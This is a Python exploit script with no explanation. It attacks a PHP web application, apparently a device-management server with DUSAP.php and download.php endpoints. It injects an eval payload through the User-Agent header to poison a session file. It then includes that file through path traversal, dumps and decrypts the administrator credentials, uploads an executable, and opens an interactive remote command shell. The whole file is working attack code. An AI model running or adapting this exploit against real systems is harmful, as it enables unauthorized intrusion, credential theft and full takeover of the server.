import httplib2,urllib,sys,base64

if(len(sys.argv) != 2):
	print 'Usage: %s %s' % (sys.argv[0],'http://example.com:80')
	sys.exit()

s1_headers = {"User-Agent":"<?php echo(eval($_GET['cmd'])); ?>","Cookie":"PHPSESSID=payload;"}
s2_req = '/DUSAP.php?language=res/languages/../../../../php/temp/sess_payload&cmd=$pass%3dmdm_ExecuteSQLQuery("SELECT+UserName,Password+FROM+Administrators+where+AdministratorSAKey+%3d+1",array(),false,-1,"","","",QUERY_TYPE_SELECT)%3becho+"%0d%0a".$pass[0]["UserName"].":".mdm_DecryptData($pass[0]["Password"])."%0d%0a"%3b'

s3_req = '/DUSAP.php?language=res/languages/../../../../php/temp/sess_payload&cmd=$wdir%3dgetcwd()."\..\..\php\\\\temp\\\\"%3bfile_put_contents($wdir."cmd.exe",base64_decode(file_get_contents("php%3a//input")))%3b'
s4_req = '/DUSAP.php?language=res/languages/../../../../php/temp/sess_payload&cmd=$wdir%3dgetcwd()."\..\..\php\\\\temp\\\\"%3b$cmd%3d$wdir."cmd.exe+XXXXXXXXXX"%3b$output%3darray()%3b$handle%3dproc_open($cmd,array(1%3d>array("pipe","w")),$pipes,null,null,array("bypass_shell"%3d>true))%3bif+(is_resource($handle)){$output%3dexplode("\\n",+stream_get_contents($pipes[1]))%3bfclose($pipes[1])%3bproc_close($handle)%3b}foreach($output+as+%26$temp){echo+$temp."\\r\\n"%3b}%3b'

url = sys.argv[1]

infile = open('cmd.exe','r')
infile = infile.read()
infile = base64.b64encode(infile)

try:
	http = httplib2.Http()
	http.follow_redirects = False
	resp,cont = http.request(url+"/download.php","HEAD",headers=s1_headers)
except:
	print '[?] Error connecting to the target.'
	print '[?] Dump..', sys.exc_info()
	sys.exit()

if(resp['status'] == '302'):
	try:
		print "[*] Session Poisoned, Retrieving Creds."
		resp,cont = http.request(url+s2_req) 
		creds = cont.split("\r\n")[1].split(":")
		print "[+] Credentials User: %s Password: %s" % (creds[0],creds[1])
		print "[!] Log into the administrative interface at: %s/dashboard/" % (sys.argv[1])
		
		print "[*] Staging exe to run"
		resp,cont = http.request(url+s3_req,"POST",body=infile)
		
		print "[*] Dropping to shell, type 'exit' to quit."
		while(1):
			cmd = urllib.quote_plus("/c " + raw_input("#:"))
			if(cmd == '%2Fc+exit'):
				break
			resp,cont = http.request(url+s4_req.replace('XXXXXXXXXX',cmd))
			print cont 
		
	except httplib2.HttpLib2Error as e:
		print '[?] Error retrieving creds'
		print '[?] ', e.strerror
	except:
		print '[?] Something happened...'
		print '[?] Dumping response', cont
		print '[?] Dump..', sys.exc_info()

			

	
